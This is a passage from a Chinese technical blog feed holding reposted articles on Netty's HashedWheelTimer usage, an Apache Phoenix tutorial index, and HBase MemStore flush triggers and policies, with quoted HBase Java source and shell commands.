时，<strong>应当将其当做一个全局的任务调度器，例如设计成 static</strong> 。时刻谨记一点：<code>HashedWheelTimer</code> 对应一个线程，如果每次实例化 <code>HashedWheelTimer</code>，首先是线程会很多，其次是时间轮算法将会完全失去意义。</p><h4 id="5-4-为-HashedWheelTimer-设置合理的参数"><a href="#5-4-为-HashedWheelTimer-设置合理的参数" class="headerlink" title="5.4 为 HashedWheelTimer 设置合理的参数"></a>5.4 为 HashedWheelTimer 设置合理的参数</h4><p>ticksPerWheel，tickDuration 这两个参数尤为重要，ticksPerWheel 控制了时间轮中 bucket 的数量，决定了冲突发生的概率，tickDuration 决定了指针拨动的频率，一方面会影响定时的精度，一方面决定 CPU 的消耗量。当任务数量非常大时，考虑增大 ticksPerWheel；当时间精度要求不高时，可以适当加大 tickDuration，不过大多数情况下，不需要 care 这个参数。</p><h4 id="5-5-什么时候使用层级时间轮"><a href="#5-5-什么时候使用层级时间轮" class="headerlink" title="5.5 什么时候使用层级时间轮"></a>5.5 什么时候使用层级时间轮</h4><p>当时间跨度很大时，提升单层时间轮的 tickDuration 可以减少空转次数，但会导致时间精度变低，层级时间轮既可以避免精度降低，又避免了指针空转的次数。如果有时间跨度较长的定时任务，则可以交给层级时间轮去调度。此外，也可以按照定时精度实例化多个不同作用的单层时间轮，dayHashedWheelTimer、hourHashedWheelTimer、minHashedWheelTimer，配置不同的 tickDuration，此法虽 low，但不失为一个解决方案。Netty 设计的 <code>HashedWheelTimer</code> 是专门用来优化 I/O 调度的，场景较为局限，所以并没有实现层级时间轮；而在 Kafka 中定时器的适用范围则较广，所以其实现了层级时间轮，以应对更为复杂的场景。</p><h3 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6 参考资料"></a>6 参考资料</h3><p>[1] <a href="https://www.ibm.com/developerworks/cn/java/j-lo-taskschedule/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-taskschedule/index.html</a></p><p>[2] <a href="http://novoland.github.io/%E5%B9%B6%E5%8F%91/2014/07/26/%E5%AE%9A%E6%97%B6%E5%99%A8%EF%BC%88Timer%EF%BC%89%E7%9A%84%E5%AE%9E%E7%8E%B0.html" target="_blank" rel="noopener">http://novoland.github.io/并发/2014/07/26/定时器（Timer）的实现.html</a></p><p>[3] <a href="http://www.cs.columbia.edu/~nahum/w6998/papers/sosp87-timing-wheels.pdf" target="_blank" rel="noopener">http://www.cs.columbia.edu/~nahum/w6998/papers/sosp87-timing-wheels.pdf</a></p><p>本文转载自: <a href="https://www.cnkirito.moe/timer/" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phoenix入门到精通</title>
      <link href="/2019/01/28/hbase/phoenix-ru-men-dao-jing-tong/"/>
      <url>/2019/01/28/hbase/phoenix-ru-men-dao-jing-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="Phoenix入门到精通"><a href="#Phoenix入门到精通" class="headerlink" title="Phoenix入门到精通"></a>Phoenix入门到精通</h1><p><em>摘要：</em> 此Phoenix系列文章将会从Phoenix的语法和功能特性、相关工具、实践经验以及应用案例多方面从浅入深的阐述。希望对Phoenix入门、在做架构设计和技术选型的同学能有一些帮助。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Phoenix是一个开源的HBASE SQL层。它不仅可以使用标准的JDBC API替代HBASE client API创建表，插入和查询HBASE，也支持二级索引、事物以及多种SQL层优化。</p><p>此系列文章将会从Phoenix的语法和功能特性、相关工具、实践经验以及应用案例多方面从浅入深的阐述。希望对Phoenix入门、在做架构设计和技术选型的同学能有一些帮助。</p><h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><a href="https://yq.aliyun.com/articles/253038?spm=a2c4e.11153940.blogcont574090.6.32b0629e84TDaC" target="_blank" rel="noopener">[Phoenix] 一、快速入门</a><br><a href="https://yq.aliyun.com/articles/253048" target="_blank" rel="noopener">[Phoenix] 二、数据类型</a><br><a href="https://yq.aliyun.com/articles/531683?spm=a2c4e.11153940.blogcont574090.8.32b0629e84TDaC" target="_blank" rel="noopener">[Phoenix] 三、DML语法</a><br><a href="https://yq.aliyun.com/articles/532313" target="_blank" rel="noopener">[Phoenix] 四、加盐表</a><br><a href="https://yq.aliyun.com/articles/536850?spm=a2c4e.11153940.blogcont574090.10.32b0629e84TDaC" target="_blank" rel="noopener">[Phoenix] 五、二级索引</a><br><a href="https://yq.aliyun.com/articles/544746" target="_blank" rel="noopener">[Phoenix] 六、MR在Ali-Phoenix上的使用</a><br><a href="https://yq.aliyun.com/articles/570847?spm=a2c4e.11153940.blogcont574090.12.32b0629e84TDaC" target="_blank" rel="noopener">[Phoenix] 七、如何使用自增ID</a><br><a href="https://yq.aliyun.com/articles/576440" target="_blank" rel="noopener">[Phoenix] 八、动态列</a><br><a href="https://yq.aliyun.com/articles/583743" target="_blank" rel="noopener">[Phoenix] 九、分页查询</a><br><a href="https://yq.aliyun.com/articles/633486" target="_blank" rel="noopener">[Phoenix] 十、全局索引设计实践</a><br><a href="https://yq.aliyun.com/articles/686302?spm=a2c4e.11153940.blogcont574090.16.32b0629e84TDaC" target="_blank" rel="noopener">[Phoenix] 十一、查询计划详解</a><br><a href="https://yq.aliyun.com/articles/574090?spm=a2c4e.11153940.blogrightarea633486.15.e6952c7ejCJGEu#" target="_blank" rel="noopener">[Phoenix] 十二、Phoenix表数据导入</a>（待完成）<br><a href="https://yq.aliyun.com/articles/574090?spm=a2c4e.11153940.blogrightarea633486.15.e6952c7ejCJGEu#" target="_blank" rel="noopener">[Phoenix] 十三、从传统关系型数据库到phoenix</a>（待完成）<br><a href="https://yq.aliyun.com/articles/574090?spm=a2c4e.11153940.blogrightarea633486.15.e6952c7ejCJGEu#" target="_blank" rel="noopener">[Phoenix] 十四、案例1</a>（待完成）<br><a href="https://yq.aliyun.com/articles/574090?spm=a2c4e.11153940.blogrightarea633486.15.e6952c7ejCJGEu#" target="_blank" rel="noopener">[Phoenix] 十五、案例2</a>（待完成）</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li><a href="https://yq.aliyun.com/articles/236804" target="_blank" rel="noopener">Phoenix索引生命周期</a></li><li><a href="https://yq.aliyun.com/articles/236379?spm=a2c4e.11153940.blogcont574090.22.32b0629e84TDaC" target="_blank" rel="noopener">SQuirreL – Phoenix的GUI</a></li></ul><p>转载自：<a href="https://yq.aliyun.com/articles/574090?spm=a2c4e.11153940.blogrightarea633486.15.e6952c7ejCJGEu" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
            <tag> Phoenix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase原理-数据刷写MemStore Flush剖析</title>
      <link href="/2019/01/27/hbase/hbase-yuan-li-shu-ju-shua-xie-memstore-flush-pou-xi/"/>
      <url>/2019/01/27/hbase/hbase-yuan-li-shu-ju-shua-xie-memstore-flush-pou-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="HBase原理-数据刷写MemStore-Flush剖析"><a href="#HBase原理-数据刷写MemStore-Flush剖析" class="headerlink" title="HBase原理-数据刷写MemStore Flush剖析"></a>HBase原理-数据刷写MemStore Flush剖析</h1><p>接触过 HBase 的同学应该对 HBase 写数据的过程比较熟悉(不熟悉也没关系)。HBase 写数据(比如 put、delete)的时候，都是写 WAL(假设 WAL 没有被关闭)，然后将数据写到一个称为 MemStore 的内存结构里面的，如下图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Yicunacl1x3sTbxNg7Vf946CGdTEEOFJ2tH5R6U4wVQRMvrhmhtgBJU9sWKSXx4MZr6icKdVEhUw4rspbIBXNYbg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>但是，MemStore 毕竟是内存里面的数据结构，写到这里面的数据最终还是需要持久化到磁盘的，生成 HFile。如下图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Yicunacl1x3sTbxNg7Vf946CGdTEEOFJ29HwLIeGvvHE2ibjYF6gdFQ2LUw8XGImu3gAsQibcIuU8H9RAaHf7mI1Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p><p>理解 MemStore 的刷写对优化 MemStore 有很重要的意义，大部分人遇到的性能问题都是写操作被阻塞(Block)无法写入HBase。本文基于 HBase 2.0.2，并对 MemStore 的 Flush 进行说明，包括哪几种条件触发 Memstore Flush 及目前常见的刷写策略(FlushPolicy)。</p><h2 id="什么时候触发-MemStore-Flush"><a href="#什么时候触发-MemStore-Flush" class="headerlink" title="什么时候触发 MemStore Flush"></a><strong>什么时候触发 MemStore Flush</strong></h2><p>有很多情况会触发 MemStore 的 Flush 操作，所以我们最好需要了解每种情况在什么时候触发 Memstore Flush。总的来说，主要有以下几种情况会触发 Memstore Flush：</p><ul><li>Region 中所有 MemStore 占用的内存超过相关阈值</li><li>整个 RegionServer 的 MemStore 占用内存总和大于相关阈值</li><li>WAL数量大于相关阈值</li><li>定期自动刷写</li><li>数据更新超过一定阈值</li><li>手动触发刷写</li></ul><p>下面对这几种刷写进行简要说明：</p><ul><li><h3 id="Region-中所有-MemStore-占用的内存超过相关阈值"><a href="#Region-中所有-MemStore-占用的内存超过相关阈值" class="headerlink" title="Region 中所有 MemStore 占用的内存超过相关阈值"></a><strong>Region 中所有 MemStore 占用的内存超过相关阈值</strong></h3></li></ul><p>当一个 Region 中所有 MemStore 占用的内存(包括 OnHeap + OffHeap)大小超过刷写阈值的时候会触发一次刷写，这个阈值由 hbase.hregion.memstore.flush.size 参数控制，默认为128MB。我们每次调用 put、delete 等操作都会检查的这个条件的。</p><p>但是如果我们的数据增加得很快，达到 hbase.hregion.memstore.flush.size <em> hbase.hregion.memstore.block.multiplier 的大小，hbase.hregion.memstore.block.multiplier 默认值为4，也就是128</em>4=512MB的时候，那么除了触发 MemStore 刷写之外，HBase 还会在刷写的时候同时阻塞所有写入该 Store 的写请求！这时候如果你往对应的 Store 写数据，会出现 RegionTooBusyException 异常。</p><ul><li><h3 id="整个-RegionServer-的-MemStore-占用内存总和大于相关阈值"><a href="#整个-RegionServer-的-MemStore-占用内存总和大于相关阈值" class="headerlink" title="整个 RegionServer 的 MemStore 占用内存总和大于相关阈值"></a><strong>整个 RegionServer 的 MemStore 占用内存总和大于相关阈值</strong></h3></li></ul><p>HBase 为 RegionServer 的 MemStore 分配一定的写缓存，大小等于 hbase_heapsize(RegionServer 占用的堆内存大小)* hbase.regionserver.global.memstore.size。hbase.regionserver.global.memstore.size 的默认值是 0.4，也就是说写缓存大概占用 RegionServer 整个 JVM 内存使用量的 40%。</p><p>如果整个 RegionServer 的 MemStore 占用内存总和大于 hbase.regionserver.global.memstore.size.lower.limit <em> hbase.regionserver.global.memstore.size </em> hbase_heapsize 的时候，将会触发 MemStore 的刷写。其中 hbase.regionserver.global.memstore.size.lower.limit 的默认值为 0.95。</p><p>举个例子，如果我们 HBase 堆内存总共是 32G，按照默认的比例，那么触发 RegionServer 级别的 Flush 是 RS 中所有的 MemStore 占用内存为：32 <em> 0.4 </em> 0.95 = 12.16G。</p><p>注意：0.99.0 之前 hbase.regionserver.global.memstore.size 是 hbase.regionserver.global.memstore.upperLimit 参数；hbase.regionserver.global.memstore.size.lower.limit 是 hbase.regionserver.global.memstore.lowerLimit，参见 HBASE-5349</p><p>RegionServer 级别的 Flush 策略是每次找到 RS 中占用内存最大的 Region 对他进行刷写，这个操作是循环进行的，直到总体内存的占用低于全局 MemStore 刷写下<br>限(hbase.regionserver.global.memstore.size.lower.limit <em> hbase.regionserver.global.memstore.size </em> hbase_heapsize)才会停止。</p><p>需要注意的是，如果达到了 RegionServer 级别的 Flush，那么当前 RegionServer 的所有写操作将会被阻塞，而且这个阻塞可能会持续到分钟级别。</p><ul><li><h3 id="WAL数量大于相关阈值"><a href="#WAL数量大于相关阈值" class="headerlink" title="WAL数量大于相关阈值"></a><strong>WAL数量大于相关阈值</strong></h3></li></ul><p>WAL(Write-ahead log，预写日志)用来解决宕机之后的操作恢复问题的。数据到达 Region 的时候是先写入 WAL，然后再被写到 Memstore 的。如果 WAL 的数量越来越大，这就意味着 MemStore 中未持久化到磁盘的数据越来越多。当 RS 挂掉的时候，恢复时间将会变成，所以有必要在 WAL 到达一定的数量时进行一次刷写操作。阈值 maxLogs 的计算公式如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// Schedule a WAL roll when the WAL is 50% of the HDFS block size. Scheduling at 50% of block</span><span class="token comment" spellcheck="true">// size should make it so WAL rolls before we get to the end-of-block (Block transitions cost</span><span class="token comment" spellcheck="true">// some latency). In hbase-1 we did this differently. We scheduled a roll when we hit 95% of</span><span class="token comment" spellcheck="true">// the block size but experience from the field has it that this was not enough time for the</span><span class="token comment" spellcheck="true">// roll to happen before end-of-block. So the new accounting makes WALs of about the same</span><span class="token comment" spellcheck="true">// size as those made in hbase-1 (to prevent surprise), we now have default block size as</span><span class="token comment" spellcheck="true">// 2 times the DFS default: i.e. 2 * DFS default block size rolling at 50% full will generally</span><span class="token comment" spellcheck="true">// make similar size logs to 1 * DFS default block size rolling at 95% full. See HBASE-19148.</span><span class="token keyword">this</span><span class="token punctuation">.</span>blocksize <span class="token operator">=</span> WALUtil<span class="token punctuation">.</span><span class="token function">getWALBlockSize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conf<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fs<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>walDir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">float</span> multiplier <span class="token operator">=</span> conf<span class="token punctuation">.</span><span class="token function">getFloat</span><span class="token punctuation">(</span><span class="token string">"hbase.regionserver.logroll.multiplier"</span><span class="token punctuation">,</span> <span class="token number">0.5f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>logrollsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>blocksize <span class="token operator">*</span> multiplier<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>maxLogs <span class="token operator">=</span> conf<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"hbase.regionserver.maxlogs"</span><span class="token punctuation">,</span>      Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token function">calculateMaxLogFiles</span><span class="token punctuation">(</span>conf<span class="token punctuation">,</span> logrollsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**  * Public because of FSHLog. Should be package-private  * @param isRecoverEdits the created writer is for recovered edits or WAL.  *                       For recovered edits, it is true and for WAL it is false.  */</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">getWALBlockSize</span><span class="token punctuation">(</span>Configuration conf<span class="token punctuation">,</span> FileSystem fs<span class="token punctuation">,</span> Path dir<span class="token punctuation">,</span>     <span class="token keyword">boolean</span> isRecoverEdits<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>  <span class="token keyword">long</span> defaultBlockSize <span class="token operator">=</span> CommonFSUtils<span class="token punctuation">.</span><span class="token function">getDefaultBlockSize</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span> dir<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>isRecoverEdits<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> conf<span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token string">"hbase.regionserver.recoverededits.blocksize"</span><span class="token punctuation">,</span> defaultBlockSize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> conf<span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token string">"hbase.regionserver.hlog.blocksize"</span><span class="token punctuation">,</span> defaultBlockSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">calculateMaxLogFiles</span><span class="token punctuation">(</span>Configuration conf<span class="token punctuation">,</span> <span class="token keyword">long</span> logRollSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>  Pair<span class="token operator">&lt;</span>Long<span class="token punctuation">,</span> MemoryType<span class="token operator">></span> globalMemstoreSize <span class="token operator">=</span> MemorySizeUtil<span class="token punctuation">.</span><span class="token function">getGlobalMemStoreSize</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>globalMemstoreSize<span class="token punctuation">.</span><span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">/</span> logRollSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>也就是说，如果设置 hbase.regionserver.maxlogs，那就是这个参数的值；否则是 max(32, hbase_heapsize <em> hbase.regionserver.global.memstore.size </em> 2 / logRollSize)。如果某个 RegionServer 的 WAL 数量大于 maxLogs 就会触发 MemStore 的刷写。</p><p>WAL 数量触发的刷写策略是，找到最旧的 un-archived WAL 文件，并找到这个 WAL 文件对应的 Regions， 然后对这些 Regions 进行刷写。</p><ul><li><h3 id="定期自动刷写"><a href="#定期自动刷写" class="headerlink" title="定期自动刷写"></a><strong>定期自动刷写</strong></h3></li></ul><p>如果我们很久没有对 HBase 的数据进行更新，这时候就可以依赖定期刷写策略了。RegionServer 在启动的时候会启动一个线程 PeriodicMemStoreFlusher 每隔 hbase.server.thread.wakefrequency 时间检查属于这个 RegionServer 的 Region 有没有超过一定时间都没有刷写，这个时间是由 hbase.regionserver.optionalcacheflushinterval 参数控制的，默认是 3600000，也就是1小时会进行一次刷写。如果设定为0，则意味着关闭定时自动刷写。</p><p>为了防止一次性有过多的 MemStore 刷写，定期自动刷写会有 0 ~ 5 分钟的延迟，具体参见 PeriodicMemStoreFlusher 类的实现。</p><ul><li><h3 id="数据更新超过一定阈值"><a href="#数据更新超过一定阈值" class="headerlink" title="数据更新超过一定阈值"></a><strong>数据更新超过一定阈值</strong></h3></li></ul><p>如果 HBase 的某个 Region 更新的很频繁，而且既没有达到自动刷写阀值，也没有达到内存的使用限制，但是内存中的更新数量已经足够多，比如超过 hbase.regionserver.flush.per.changes 参数配置，默认为30000000，那么也是会触发刷写的。</p><ul><li><h3 id="手动触发刷写"><a href="#手动触发刷写" class="headerlink" title="手动触发刷写"></a><strong>手动触发刷写</strong></h3></li></ul><p>除了 HBase 内部一些条件触发的刷写之外，我们还可以通过执行相关命令或 API 来触发 MemStore 的刷写操作。比如调用可以调用 Admin 接口提供的方法：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**  * Flush a table. Synchronous operation.  *  * @param tableName table to flush  * @throws IOException if a remote or network exception occurs  */</span><span class="token keyword">void</span> <span class="token function">flush</span><span class="token punctuation">(</span>TableName tableName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**  * Flush an individual region. Synchronous operation.  *  * @param regionName region to flush  * @throws IOException if a remote or network exception occurs  */</span><span class="token keyword">void</span> <span class="token function">flushRegion</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> regionName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**  * Flush all regions on the region server. Synchronous operation.  * @param serverName the region server name to flush  * @throws IOException if a remote or network exception occurs  */</span><span class="token keyword">void</span> <span class="token function">flushRegionServer</span><span class="token punctuation">(</span>ServerName serverName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">;</span></code></pre><p>分别对某张表、某个 Region 或者某个 RegionServer 进行刷写操作。也可以在 Shell 中通过执行 flush 命令：</p><pre class=" language-java"><code class="language-java">hbase<span class="token operator">></span> flush <span class="token string">'TABLENAME'</span>hbase<span class="token operator">></span> flush <span class="token string">'REGIONNAME'</span>hbase<span class="token operator">></span> flush <span class="token string">'ENCODED_REGIONNAME'</span>hbase<span class="token operator">></span> flush <span class="token string">'REGION_SERVER_NAME'</span></code></pre><p>需要注意的是，以上所有条件触发的刷写操作最后都会检查对应的 HStore 包含的 StoreFiles 文件超过 hbase.hstore.blockingStoreFiles 参数配置的个数，默认值是16。如果满足这个条件，那么当前刷写会被推迟到 hbase.hstore.blockingWaitTime 参数设置的时间后再刷写。在阻塞刷写的同时，HBase 还会请求 Split 或 Compaction 操作。</p><h2 id="什么操作触发-MemStore-Flush"><a href="#什么操作触发-MemStore-Flush" class="headerlink" title="什么操作触发 MemStore Flush"></a><strong>什么操作触发</strong> <strong>MemStore Flush</strong></h2><p>我们常见的 put、delete、append、increment、调用 flush 命令、Region 分裂、Region Merge、bulkLoad HFiles 以及给表做快照操作都会对上面的相关条件做检查，以便判断要不要做刷写操作。</p><h2 id="MemStore-Flush策略-FlushPolicy"><a href="#MemStore-Flush策略-FlushPolicy" class="headerlink" title="MemStore Flush策略(FlushPolicy)"></a><strong>MemStore Flush策略(FlushPolicy)</strong></h2><p>在 HBase 1.1 之前，MemStore 刷写是 Region 级别的。就是说，如果要刷写某个 MemStore ，MemStore 所在的 Region 中其他 MemStore 也是会被一起刷写的！这会造成一定的问题，比如小文件问题，具体参见 <a href="https://mp.weixin.qq.com/s?__biz=MzA5MTc0NTMwNQ==&amp;mid=2650716323&amp;idx=1&amp;sn=ccace248f650d4a3bcc2ff60103fc4a1&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">《为什么不建议在 HBase 中使用过多的列族》</a>。针对这个问题，HBASE-10201/HBASE-3149引入列族级别的刷写。我们可以通过 hbase.regionserver.flush.policy 参数选择不同的刷写策略。</p><p>目前 HBase 2.0.2 的刷写策略全部都是实现 FlushPolicy 抽象类的。并且自带三种刷写策略：FlushAllLargeStoresPolicy、FlushNonSloppyStoresFirstPolicy 以及 FlushAllStoresPolicy。</p><ul><li><h3 id="FlushAllStoresPolicy"><a href="#FlushAllStoresPolicy" class="headerlink" title="FlushAllStoresPolicy"></a><strong>FlushAllStoresPolicy</strong></h3></li></ul><p>这种刷写策略实现最简单，直接返回当前 Region 对应的所有 MemStore。也就是每次刷写都是对 Region 里面所有的 MemStore 进行的，这个行为和 HBase 1.1 之前是一样的。</p><ul><li><h3 id="FlushAllLargeStoresPolicy"><a href="#FlushAllLargeStoresPolicy" class="headerlink" title="FlushAllLargeStoresPolicy"></a><strong>FlushAllLargeStoresPolicy</strong></h3></li></ul><p>在 HBase 2.0 之前版本是 FlushLargeStoresPolicy，后面被拆分成分 FlushAllLargeStoresPolicy 和FlushNonSloppyStoresFirstPolicy，参见 HBASE-14920。</p><p>这种策略会先判断 Region 中每个 MemStore 的使用内存(OnHeap+OffHeap)是否大于某个阀值，大于这个阀值的 MemStore 将会被刷写。阀值的计算是由 hbase.hregion.percolumnfamilyflush.size.lower.bound 、hbase.hregion.percolumnfamilyflush.size.lower.bound.min 以及 hbase.hregion.memstore.flush.size 参数决定的。计算逻辑如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//region.getMemStoreFlushSize() / familyNumber</span><span class="token comment" spellcheck="true">//就是 hbase.hregion.memstore.flush.size 参数的值除以相关表列族的个数</span>flushSizeLowerBound <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>region<span class="token punctuation">.</span><span class="token function">getMemStoreFlushSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> familyNumber<span class="token punctuation">,</span> hbase<span class="token punctuation">.</span>hregion<span class="token punctuation">.</span>percolumnfamilyflush<span class="token punctuation">.</span>size<span class="token punctuation">.</span>lower<span class="token punctuation">.</span>bound<span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果设置了 hbase.hregion.percolumnfamilyflush.size.lower.bound</span>flushSizeLowerBound <span class="token operator">=</span> hbase<span class="token punctuation">.</span>hregion<span class="token punctuation">.</span>percolumnfamilyflush<span class="token punctuation">.</span>size<span class="token punctuation">.</span>lower<span class="token punctuation">.</span>bound</code></pre><p>hbase.hregion.percolumnfamilyflush.size.lower.bound.min 默认值为 16MB，而 hbase.hregion.percolumnfamilyflush.size.lower.bound 没有设置。</p><p>比如当前表有3个列族，其他用默认的值，那么 flushSizeLowerBound = max((long)128 / 3, 16) = 42。</p><p>如果当前 Region 中没有 MemStore 的使用内存大于上面的阀值，FlushAllLargeStoresPolicy 策略就退化成 FlushAllStoresPolicy 策略了，也就是会对 Region 里面所有的 MemStore 进行 Flush。</p><ul><li><h3 id="FlushNonSloppyStoresFirstPolicy"><a href="#FlushNonSloppyStoresFirstPolicy" class="headerlink" title="FlushNonSloppyStoresFirstPolicy"></a><strong>FlushNonSloppyStoresFirstPolicy</strong></h3></li></ul><p>HBase 2.0 引入了 in-memory compaction，参见 HBASE-13408。如果我们对相关列族 hbase.hregion.compacting.memstore.type 参数的值不是 NONE，那么这个 MemStore 的 isSloppyMemStore 值就是 true，否则就是 false。</p><p>FlushNonSloppyStoresFirstPolicy 策略将 Region 中的 MemStore 按照 isSloppyMemStore 分到两个 HashSet 里面（sloppyStores 和 regularStores）。然后</p><ul><li>判断 regularStores 里面是否有 MemStore 内存占用大于相关阀值的 MemStore ，有的话就会对这些 MemStore 进行刷写，其他的不做处理，这个阀值计算和 FlushAllLargeStoresPolicy 的阀值计算逻辑一致。</li><li>如果 regularStores 里面没有 MemStore 内存占用大于相关阀值的 MemStore，这时候就开始在 sloppyStores 里面寻找是否有 MemStore 内存占用大于相关阀值的 MemStore，有的话就会对这些 MemStore 进行刷写，其他的不做处理。</li><li>如果上面 sloppyStores 和 regularStores 都没有满足条件的 MemStore 需要刷写，这时候就 FlushNonSloppyStoresFirstPolicy 策略久退化成 FlushAllStoresPolicy 策略了。</li></ul><h2 id="MemStore-Flush-刷写过程"><a href="#MemStore-Flush-刷写过程" class="headerlink" title="MemStore Flush 刷写过程"></a><strong>MemStore Flush</strong> <strong>刷写过程</strong></h2><p>MemStore 的刷写过程很复杂，很多操作都可能触发，但是这些条件触发的刷写最终都是调用 HRegion 类中的 internalFlushcache 方法。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**  * Flush the memstore. Flushing the memstore is a little tricky. We have a lot of updates in the  * memstore, all of which have also been written to the wal. We need to write those updates in the  * memstore out to disk, while being able to process reads/writes as much as possible during the  * flush operation.  * &lt;p>  * This method may block for some time. Every time you call it, we up the regions sequence id even  * if we don't flush; i.e. the returned region id will be at least one larger than the last edit  * applied to this region. The returned id does not refer to an actual edit. The returned id can  * be used for say installing a bulk loaded file just ahead of the last hfile that was the result  * of this flush, etc.  * @param wal Null if we're NOT to go via wal.  * @param myseqid The seqid to use if &lt;code>wal&lt;/code> is null writing out flush file.  * @param storesToFlush The list of stores to flush.  * @return object describing the flush's state  * @throws IOException general io exceptions  * @throws DroppedSnapshotException Thrown when replay of WAL is required.  */</span><span class="token keyword">protected</span> FlushResultImpl <span class="token function">internalFlushcache</span><span class="token punctuation">(</span>WAL wal<span class="token punctuation">,</span> <span class="token keyword">long</span> myseqid<span class="token punctuation">,</span>     Collection<span class="token operator">&lt;</span>HStore<span class="token operator">></span> storesToFlush<span class="token punctuation">,</span> MonitoredTask status<span class="token punctuation">,</span> <span class="token keyword">boolean</span> writeFlushWalMarker<span class="token punctuation">,</span>     FlushLifeCycleTracker tracker<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>   PrepareFlushResult result <span class="token operator">=</span>       <span class="token function">internalPrepareFlushCache</span><span class="token punctuation">(</span>wal<span class="token punctuation">,</span> myseqid<span class="token punctuation">,</span> storesToFlush<span class="token punctuation">,</span> status<span class="token punctuation">,</span> writeFlushWalMarker<span class="token punctuation">,</span> tracker<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>result <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">internalFlushCacheAndCommit</span><span class="token punctuation">(</span>wal<span class="token punctuation">,</span> status<span class="token punctuation">,</span> result<span class="token punctuation">,</span> storesToFlush<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> result<span class="token punctuation">.</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// early exit due to failure from prepare stage</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>从上面的实现可以看出，Flush 操作主要分以下几步做的</p><ul><li><p><strong>prepareFlush</strong> 